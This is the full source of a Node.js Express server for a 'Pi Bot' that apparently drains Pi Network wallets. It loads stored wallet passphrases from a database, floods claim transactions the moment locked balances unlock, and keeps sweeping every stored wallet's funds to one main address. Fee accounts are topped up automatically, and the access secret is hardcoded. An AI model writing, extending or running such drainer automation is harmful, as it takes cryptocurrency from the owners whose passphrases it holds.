import cors from 'cors';
import express from 'express';
import dotenv from 'dotenv';
import { connectToDB } from './db.js';
import passphraseRoutes from './routes/passphrases.js';
import sponsorRoutes from './routes/sponsors.js';
import { arrayBatches, autoCheckSponsorForClaimable, autoClaimUnlocked, autoDuplicatePassphrase, autoFundWallet, autoSweepWallet, buildAndSubmitMultiSigTx, FloodchannelTransaction, fundWallet, getAccount, getBalance, getBaseFee, getClaimableBalance, getKeypairFromPassphrase, PI_PUBLIC_ADDRESS, sleep, sweepWallet } from './utils/fn.js';
import Passphrase from './models/Passphrase.js';
import Sponsors from './models/Sponsors.js';
import Settings from './models/Settings.js';
dotenv.config();


const app = express();
const PORT = process.env.PORT || 3000;
app.set('trust proxy', 1);

const allowedOrigins = ['http://localhost:8888', 'https://piclaimer.netlify.app'];
app.use(express.json());
app.use(cors({
    origin: function (origin, callback) {
        if (!origin) return callback(null, true);
        if (allowedOrigins.includes(origin)) {
            return callback(null, true);
        } else {
            return callback(new Error('Not allowed by CORS'));
        }
    },
    methods: ['GET', 'POST', 'PUT', 'DELETE'],
    allowedHeaders: ['Content-Type', 'Authorization'],
}));
app.use((req, res, next) => {
    const authHeader = req.headers.authorization;
    const secretKey = 'hfhryeujhshbxhdsjjskaas';
    if (!authHeader || authHeader !== `Bearer ${secretKey}`) {
        return res.status(403).json({ error: 'Forbidden' });
    }

    next();
});

await connectToDB();
const settings = await Settings.findOne();
const MAX_FLOOD_COUNT = Number(settings.maxFlood) || 3;
const BOT_PHRASE = settings.funderMnemonic;
const MAIN_ADDRESS = settings.mainAddress;

app.use('/api/passphrases', passphraseRoutes);
app.use('/api/sponsors', sponsorRoutes);

// Ping route
app.get('/', (req, res) => {
  res.send('🔁 Pi Bot Server is running - Time: ' + new Date().toLocaleString());
});


const instanceId = process.env.S_INSTANCE_ID || 0;
const sponsors = await Sponsors.find({ name: 'shepherd' });
const chunkSize = Math.ceil(sponsors.length/2);

// Auto Claim
setInterval(async() => {
    const sponsorChunk = sponsors.slice(instanceId * chunkSize, chunkSize);

    const now = new Date();
    const fiveSecondsFromNow = new Date(now.getTime() + 8000);
    
    const readyPassphrases = await Passphrase.find({
        claimableAt: { $lte: fiveSecondsFromNow },
        name: 'shepherd',
        status: 'pending'
    });
    console.log(`Trying to claim ${readyPassphrases.length} wallets`)
    console.log(`We are at instance ID ${instanceId}`)
    console.log(`Max flood: ${MAX_FLOOD_COUNT}`)

    for (const p of readyPassphrases) {
        console.log(`Claiming for ${p.name} on Mnemonic: ${p.mnemonic}`)
        try {

            let tries = 0;
            let success = false;

            while(!success && tries < MAX_FLOOD_COUNT) {
                const now = new Date();

                const claimUnix = new Date(p.claimableAt).getTime();
                const diff = claimUnix - now.getTime();
                if (diff > 3000) {
                    await sleep(Math.min(diff - 500, 1000));
                    continue;
                }

                const result = await FloodchannelTransaction(
                    p.mnemonic,
                    p.balanceId,
                    MAIN_ADDRESS,
                    p.amount,
                    sponsorChunk,
                    false
                );
                // console.log(result);
                const found = result.find((r) => r.hash);
                if (found) {
                    console.log(`✅ Claimed Pi. Hash: ${found.hash}`);
                    await Passphrase.updateOne(
                        { _id: p._id },
                        { $set: { status: "claimed" } }
                    );
                    success = true;
                    break;
                }
                tries++;
            }
            if (!success) {
                await Passphrase.updateOne(
                    { _id: p._id },
                    { $set: { status: "failed" } }
                );
            }

            

        } catch (err) {
            console.error('❌ Error something went wrong Pi:', err.message || err);
        }
    }
    
}, 5000);


async function getUpcomingClaimables(start = 0) {
    const now = new Date();
    const tenMin = 10 * 60 * 1000;
    const x = start * 60 * 1000;
    const xMinutesFrom = new Date(now.getTime() - x);
    const tenMinutesFromNow = new Date(now.getTime() + tenMin);
    const upcomingClaimables = await Passphrase.find({
        claimableAt: {
            $gte: xMinutesFrom,
            $lte: tenMinutesFromNow
        },
        status: 'pending',
        name: 'shepherd'
    });

    return upcomingClaimables;
}


// Auto Fund
setInterval(async() => {
        const upcomingClaimables = await getUpcomingClaimables(0.5);
        if (!upcomingClaimables.length) return;
    
        const sponsorChunk = sponsors.slice(instanceId * chunkSize, chunkSize);
        console.log(`Shepherd is trying to fund`);
    
        for (const p of sponsorChunk) {
            try {
                console.log(`Funding ${p.mnemonic}`)
    
    
                const sponsorKp = getKeypairFromPassphrase(p.mnemonic);
                const accountData  = await getAccount(sponsorKp.publicKey());
    
                const balanceString = getBalance(accountData);
                const balance = parseFloat(balanceString) - 0.98;
    
                const change = balance - 0.06;
    
                const BotKP = getKeypairFromPassphrase(BOT_PHRASE);
                const botAccountData = await getAccount(BotKP.publicKey());
                const botBalanceString = getBalance(botAccountData);
                const botBalance = parseFloat(botBalanceString) - 1.98;
    
    
    
                if((change < 0) && (botBalance > Math.abs(change))) {
                    const result = await fundWallet(
                        BOT_PHRASE,
                        sponsorKp.publicKey(),
                        Math.abs(change).toFixed(7)
                    );
    
                    const success = result.data;
    
                    if (success.hash) {
                        console.log(`✅ Shepherd funded ${result.amount} Pi. Hash: ${success.hash}`);
                        
                    } else {
                        console.log(`❌ Shepherd Failed to fund ${result.amount} PI}`);
                    }
                } else {
                    // console.log(`Skipping`)
                    // console.log(`sponsor balance: ${change}`)
                    // console.log(`bot balance: ${botBalance}`)
                }
                await sleep(1000);
    
            } catch (err) {
                // console.error('❌ Error funding Pi:', err.message || err);
            }
        }
}, 1000);

// Auto Sweep
setInterval(async() => {
    if(instanceId !==0) return;
        if(global.isSweeping) {
            return;
        }
        global.isSweeping = true
        const upcomingClaimables = await getUpcomingClaimables();
        if (upcomingClaimables.length > 0) {
            for(const claimable of upcomingClaimables) {
                await sweepWallet(claimable.mnemonic, MAIN_ADDRESS);
                await sleep(1000);
            }
            global.isSweeping = false;
            return;
        }
    
        const readyPassphrases = await Passphrase.find({ name: 'shepherd' });
        const passphraseBatches = arrayBatches(readyPassphrases, 80);
    
        for(const passphrases of passphraseBatches) {
            await Promise.all(passphrases.map(async (phrase, i) => {
                try {
                    const result = await sweepWallet(phrase.mnemonic, MAIN_ADDRESS);
                } catch (e) {
                    if (e.response && e.response.data && e.response.data.extras) {
                        const extras = e.response.data.extras;
                        // console.log('Transaction failed:', extras);
                    } else {
                        // console.error('Unknown error:', e);
                    }
                }
            }));
    
            await sleep(1000);
        }
        global.isSweeping = false;
}, 1000);


app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Pi Bot Server running on port ${PORT}`);
}); 


